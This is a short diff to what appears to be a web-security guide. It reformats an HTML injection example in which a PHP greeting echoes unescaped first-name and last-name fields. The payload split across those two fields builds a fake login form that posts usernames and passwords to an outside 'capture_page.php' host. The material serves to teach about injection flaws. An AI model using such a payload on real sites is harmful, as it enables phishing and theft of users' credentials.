@@ -291,10 +291,16 @@ echo “Hello $firstname $lastname!”;
 
 Payload:
 
-- firstname: `<form action=”http://www.mysite.it/capture_page.php”>
-                Username: <input name=”user” type=”text”/><br/>`
-- lastname:  `Password: <input name=”pass” type=”password”/>
-            </form>`
+- firstname: 
+```
+<form action=”http://www.mysite.it/capture_page.php”>
+  Username: <input name=”user” type=”text”/><br/>
+```
+- lastname:
+```
+  Password: <input name=”pass” type=”password”/>
+</form>
+```
 - Output:    `Hello [ Fake login form ]!`
 
 
